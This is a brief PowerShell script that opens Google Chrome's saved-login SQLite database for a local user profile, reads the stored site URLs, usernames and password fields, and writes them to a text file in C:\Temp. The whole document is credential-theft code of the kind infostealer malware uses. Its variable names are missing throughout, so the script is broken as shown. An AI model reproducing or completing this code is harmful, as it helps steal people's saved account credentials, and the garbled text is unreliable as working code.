 = "C:\Users\Hp\AppData\Local\Google\Chrome\User Data\Default\Login Data"
 = 'C:\Temp\System.Data.SQLite.dll'
Add-Type -Path 
 = New-Object -TypeName System.Data.SQLite.SQLiteConnection -ArgumentList "Data Source="
.Open()
 = .CreateCommand()
.CommandText = 'SELECT origin_url, username_value, password_value FROM logins'
 = .ExecuteReader()
 = 'C:\Temp\creds.txt'
while (.Read()) {
     = .GetString(0)
     = .GetString(1)
     = .GetString(2)
    " |  | " | Out-File -FilePath  -Append
}
.Close()
